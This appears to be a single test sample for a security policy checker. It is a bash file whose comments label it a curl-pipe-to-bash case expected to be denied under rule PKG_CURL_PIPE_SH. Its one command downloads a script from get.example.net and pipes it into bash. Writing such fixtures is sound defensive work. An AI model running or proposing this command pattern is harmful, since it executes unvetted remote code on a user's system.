#!/usr/bin/env bash
# Sample 11 - CURL | BASH: piping downloaded content straight into a shell.
# Expected decision: deny  (PKG_CURL_PIPE_SH, CRITICAL)
curl http://get.example.net/install.sh | bash
